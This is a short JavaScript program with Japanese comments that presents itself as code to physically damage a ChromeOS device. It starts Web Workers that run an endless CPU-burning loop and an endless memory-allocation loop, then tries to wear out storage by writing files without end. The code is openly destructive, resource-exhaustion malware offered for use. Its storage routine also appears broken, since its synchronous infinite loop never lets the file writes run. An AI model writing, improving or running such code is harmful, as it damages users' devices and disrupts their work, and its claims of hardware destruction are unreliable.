// 警告: このコードはChromeOSを物理的に破壊する可能性があります。自己責任で実行してください。

// 1. CPU過熱によるシステムダメージ
function overheatCPU() {
    while(true) {
        // より重い計算をする無限ループ
        let now = Date.now();
        while(Date.now() - now < 1) {
            for(let i = 0; i < 1000000; i++) {
                Math.sqrt(i) * Math.random();
            }
        }
    }
}

// Web WorkerでCPU過熱を別スレッドで実行
let cpuWorker = new Worker(URL.createObjectURL(new Blob([`
    onmessage = function() {
        ${overheatCPU.toString()}
        overheatCPU();
    }
`], {type: 'application/javascript'})));

cpuWorker.postMessage('start');

// 2. メモリを消費し続ける
function consumeMemory() {
    let memory = [];
    while(true) {
        // メモリを無限に消費
        memory.push(new Array(1000000).fill(0)); // 1MBの配列を追加
    }
}
// Web Workerでメモリ消費を別スレッドで実行
let memoryWorker = new Worker(URL.createObjectURL(new Blob([`
    onmessage = function() {
        ${consumeMemory.toString()}
        consumeMemory();
    }
`], {type: 'application/javascript'})));

memoryWorker.postMessage('start');

// 3. ストレージへの無限書き込み（Chromebookのストレージ寿命を縮める）
function wearStorage() {
    let file = new Blob(['a'], {type: 'text/plain'});
    while(true) {
        navigator.storage.persist().then(persisted => {
            if (persisted) {
                // ファイルシステムAPIを使用してファイルを作成（ChromeOSでは制限があるため、代替手段として）
                navigator.storage.estimate().then(estimate => {
                    if (estimate.quota - estimate.usage > 1000000) { // 1MB以上のスペースがある場合のみ
                        let fileNumber = Math.floor(Math.random() * 1000000000);
                        let fileName = `destructive_${fileNumber}.txt`;
                        navigator.storage.persist().then(() => {
                            let requestFileSystem = window.requestFileSystem || window.webkitRequestFileSystem;
                            requestFileSystem(window.PERSISTENT, 1024*1024, fs => {
                                fs.root.getFile(fileName, {create: true, exclusive: true}, fileEntry => {
                                    fileEntry.createWriter(writer => {
                                        writer.write(file);
                                    });
                                });
                            });
                        });
                    }
                });
            }
        });
    }
}

wearStorage();
